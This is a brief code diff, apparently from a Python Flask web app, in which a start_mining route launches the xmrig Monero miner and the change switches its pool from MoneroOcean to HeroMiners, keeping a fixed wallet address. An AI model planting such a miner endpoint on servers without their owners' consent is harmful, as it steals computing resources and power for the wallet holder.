@@ -9,7 +9,7 @@ miner_process = None
 def start_mining():
     global miner_process
     if miner_process is None:
-        miner_process = subprocess.Popen(["./xmrig", "-o", "gulf.moneroocean.stream:10128", "-u", "46pdUzs2AiQNC4c7oS8rWFddLzjqfe3emUuWaoh2XxcCNANBwTtTAhbBnmMbrnsCBE54TQ9xYUAPwJkint86ZWDoPr87MAm", "-p", "x"])
+        miner_process = subprocess.Popen(["./xmrig", "-o","in.monero.herominers.com:1111", "-u", "46pdUzs2AiQNC4c7oS8rWFddLzjqfe3emUuWaoh2XxcCNANBwTtTAhbBnmMbrnsCBE54TQ9xYUAPwJkint86ZWDoPr87MAm", "-p", "x"])
     return "Mining Started"
 
 @app.route('/stop', methods=['POST'])
